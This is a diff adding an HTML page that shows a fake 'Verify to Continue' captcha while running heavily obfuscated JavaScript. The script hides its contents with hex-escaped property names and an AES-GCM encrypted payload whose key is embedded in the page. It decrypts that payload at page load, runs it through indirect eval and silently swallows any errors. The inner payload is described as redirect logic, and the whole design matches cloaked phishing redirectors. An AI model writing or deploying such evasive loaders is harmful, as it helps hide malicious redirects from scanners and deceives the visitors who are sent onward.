@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex,nofollow">
+  <title>Centered reCAPTCHA Redirect</title>
+  <!--
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║  Encryption Architecture                                         ║
+    ║                                                                  ║
+    ║  LAYER 2 — Inner payload:                                        ║
+    ║    JavaScript redirect logic                                     ║
+    ║    Encoding: Base64 → executed via eval(atob(...))               ║
+    ║                                                                  ║
+    ║  LAYER 1 — Outer wrapper:                                        ║
+    ║    AES-GCM 128-bit (Web Crypto API)                              ║
+    ║    Key  (lj8): PVfB+BDbyDMPvI7jYMrIqQ==                         ║
+    ║    IV   (xb1): Vblhj63Jlu7VYy7O                                  ║
+    ║    Tag  (gk9): GCM authentication tag (128-bit)                  ║
+    ║    Data (kz8): AES-GCM ciphertext (base64)                       ║
+    ║    Blob      : kz8 + gk9 (concatenated final ciphertext)         ║
+    ╚══════════════════════════════════════════════════════════════════╝
+  -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <style>
+    body,html{height:100%;margin:0;font-family:Arial,sans-serif;display:flex;
+              justify-content:center;align-items:center;background-color:#f4f4f4}
+    .form-container{text-align:center;padding:20px;background:#fff;
+                    border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,.1)}
+    .g-recaptcha{display:inline-block;margin-bottom:15px}
+    input[type=submit]{padding:10px 20px;font-size:16px;border:none;
+                       background-color:#4CAF50;color:#fff;cursor:pointer;
+                       border-radius:5px}
+    input[type=submit]:hover{background-color:#45a049}
+  </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+
+<div class="form-container">
+  <h2>Verify to Continue</h2>
+  <form id="recaptchaForm">
+    <div class="g-recaptcha" data-sitekey="0x4AAAAAADOhg2X1tnTMdDX3FU_8rdexILw"></div><br>
+    <input type="submit" value="Proceed">
+  </form>
+</div>
+
+<script>
+/* ══════════════════════════════════════════════════════════════════════
+   OBFUSCATED RUNTIME — AES-GCM LAYER 1 + BASE64 LAYER 2
+   ══════════════════════════════════════════════════════════════════════ */
+
+/* ── Obfuscation helpers ─────────────────────────────────────────────── */
+var _$c  = String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'];  // String.fromCharCode
+var _$a  = function(s){ return atob(s); };                                  // atob shorthand
+var _$td = function(){ return new TextDecoder(); };                         // TextDecoder factory
+var _$u8 = function(n){ return new Uint8Array(n); };                        // Uint8Array factory
+
+/* ── base64 → Uint8Array ─────────────────────────────────────────────── */
+var _B2U = function(b){
+  var s = _$a(b), u = _$u8(s['\x6c\x65\x6e\x67\x74\x68']);
+  for(var i=0;i<s['\x6c\x65\x6e\x67\x74\x68'];i++) u[i]=s['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](i);
+  return u;
+};
+
+/* ══════════════════════════════════════════════════════════════════════
+   LAYER 1 ENCRYPTED VARIABLES
+   ══════════════════════════════════════════════════════════════════════
+
+   kz8  — AES-GCM ciphertext   (base64)
+   lj8  — AES-128 key           (base64)
+   xb1  — GCM IV / nonce        (base64)
+   gk9  — GCM authentication tag(base64)
+   Final ciphertext blob = kz8 + gk9
+   ══════════════════════════════════════════════════════════════════════ */
+
+// kz8: AES-GCM encrypted ciphertext (base64-encoded)
+var kz8 = (function(){
+  var _p = [
+    '\x6c\x6d\x31\x76\x35\x47\x30\x37\x42\x78\x58\x55\x47\x75\x50\x37',
+    '\x6f\x4e\x48\x61\x47\x79\x6f\x64\x76\x54\x38\x43\x66\x79\x48\x63',
+    '\x68\x59\x31\x45\x69\x43\x70\x4c\x7a\x76\x6b\x7a\x4f\x63\x62\x53',
+    'ZQzuhAyFNiQQJPLG39efOS8wiiHLpHxnGH7U0fbp82OYNwQ4StvRP',
+    'ugHRNxkGyWU5TnkLrkLUsU58h2pVHdyw2j951x4lawkBAv3F3TaS1',
+    'aJPScgM7uqLf76vh4vofy7Wl2PPp+XwfnWw1lE5U0e793RDuo0c8F',
+    'KJ8m+wnUnwMxNhUgmx59ko480kd1YNiiqwxk0hwUmQAdQwOv/Jn9S',
+    'GWHhHt087h9GHKk/UU5bVBC/UZmqIAeZfRCCDdz6AypGIyAT07LV',
+    '7r30RCDjYXxo8VkiEcmJa2oOZu2VqJppnInkn7wKbFWlzzn1T5Fel',
+    '26K4bZqjFu0UcStWMi9uK82SObEtfwZqLXVdaJYhy0O+H0LqTdFef',
+    'djOKL2wucU0IVrgYgBfx3QDdSxbllElY0tODM6of8wfv833KI0K10',
+    'FJUrJeC1B5ZOKUksz1NxCjgPjBzd+czRL6llZ2NaAw6Of/AwMfEqr',
+    '/9ozypruuROtPPEv05vCr5qJTuUq81LPByQgxFGeRHIOhWANDppSgi',
+    '1Zw6EOLcPiVCQ5JoyeArjSiFkuiK9wp6FJIF2Xs/1kVgqbebS1kUU',
+    'CWWFPV30/5ETpGKPegYJilyDjbQO4aYfu2114oBeWMKbiVoPsEeqmM',
+    'MAZ/d2K6YCNvqn46y0omHZvC0LQ1lGrKH57uklWzuV/fTjDM8hZI5',
+    '4k4Ev3PoGcQ0NkDJoHtdbrPManG85BNk2RpULQz2x1p4M7KKiyn4b',
+    'vHPPjeCXbibBMCDswznHX3b7VCbZRjd7A8pgOh0IQfcWmJtUv50kb',
+    'cYQoa27VxxBSM++e9ClG3V4BSTU7bG2XSFS8GE8vPRxreARvs09x7Z',
+    'HxBy87hzUeUyFHTEq2woOgoRqR5+bJIDuc6zkms2SUHHbDmMxwyxIp',
+    '8j9HfDQg0aHBa3xWIu68RbHry9yF2eI6fyxzmo/ZpAj/YlxVcHK8f',
+    'rq267F4ON6kNdr5KRaWlCuizeT2x9eltA=='
+  ];
+  return _p['\x6a\x6f\x69\x6e']('');
+})();
+
+// lj8: AES-128 key (base64) — stored as char-code array
+var lj8 = (function(){
+  var _k=[80,86,102,66,43,66,68,98,121,68,77,80,118,73,55,106,89,77,114,73,113,81,61,61];
+  return _k['\x6d\x61\x70'](function(c){return _$c(c)})['\x6a\x6f\x69\x6e']('');
+})();
+
+// xb1: GCM IV / nonce (base64) — stored as char-code array
+var xb1 = (function(){
+  var _v=[86,98,108,104,106,54,51,74,108,117,55,86,89,121,55,79];
+  return _v['\x6d\x61\x70'](function(c){return _$c(c)})['\x6a\x6f\x69\x6e']('');
+})();
+
+// gk9: GCM auth tag (base64) — stored as hex-escaped string
+var gk9 = (function(){
+  var _h = '\x4f\x30\x58\x6e\x58\x4f\x32\x46\x6d\x55\x36\x4c\x73\x6d\x66'+
+            '\x4e\x4d\x4e\x4a\x78\x47\x67\x3d\x3d';
+  return _h;
+})();
+
+/* ── Final ciphertext blob = kz8 + gk9 (concatenated) ──────────────── */
+var _blob = kz8 + gk9;   // full opaque payload
+
+/* ══════════════════════════════════════════════════════════════════════
+   LAYER 1 DECRYPTOR — Web Crypto AES-GCM 128-bit
+   ══════════════════════════════════════════════════════════════════════ */
+(function _0xL1(){
+
+  /* Split blob back into ciphertext + tag */
+  var _ct  = _B2U(kz8);
+  var _tag = _B2U(gk9);
+
+  /* Build payload buffer: ciphertext || authTag (SubtleCrypto expects this) */
+  var _buf = _$u8(_ct['\x6c\x65\x6e\x67\x74\x68'] + _tag['\x6c\x65\x6e\x67\x74\x68']);
+  _buf['\x73\x65\x74'](_ct, 0);
+  _buf['\x73\x65\x74'](_tag, _ct['\x6c\x65\x6e\x67\x74\x68']);
+
+  /* Decode key + IV */
+  var _kBuf = _B2U(lj8);
+  var _iBuf = _B2U(xb1);
+
+  /* ── Web Crypto: importKey ──────────────────────────────────────── */
+  var _wc = window['\x63\x72\x79\x70\x74\x6f']['\x73\x75\x62\x74\x6c\x65'];
+
+  _wc['\x69\x6d\x70\x6f\x72\x74\x4b\x65\x79'](
+    { '\x6e\x61\x6d\x65': '\x41\x45\x53\x2d\x47\x43\x4d' },
+    _kBuf,
+    false,
+    ['\x64\x65\x63\x72\x79\x70\x74']
+  )
+  ['\x74\x68\x65\x6e'](function(_ck){
+
+    /* ── Web Crypto: decrypt ──────────────────────────────────────── */
+    return _wc['\x64\x65\x63\x72\x79\x70\x74'](
+      {
+        '\x6e\x61\x6d\x65'        : '\x41\x45\x53\x2d\x47\x43\x4d',
+        '\x69\x76'                : _iBuf,
+        '\x74\x61\x67\x4c\x65\x6e\x67\x74\x68': 128
+      },
+      _ck,
+      _buf
+    );
+
+  })
+  ['\x74\x68\x65\x6e'](function(_plain){
+
+    /* ArrayBuffer → UTF-8 string = "eval(atob('...LAYER2...'))" */
+    var _src = _$td()['\x64\x65\x63\x6f\x64\x65'](_plain);
+
+    /* ── LAYER 2: execute Base64-encoded inner script ─────────────── */
+    /* Uses indirect eval to avoid strict-mode direct-eval scope leak  */
+    ;(0, eval)(_src);
+
+  })
+  ['\x63\x61\x74\x63\x68'](function(){
+    /* Swallow errors silently — expose nothing */
+    void(0);
+  });
+
+})(); /* ── end _0xL1 IIFE ── */
+
+</script>
+</body>
+</html>
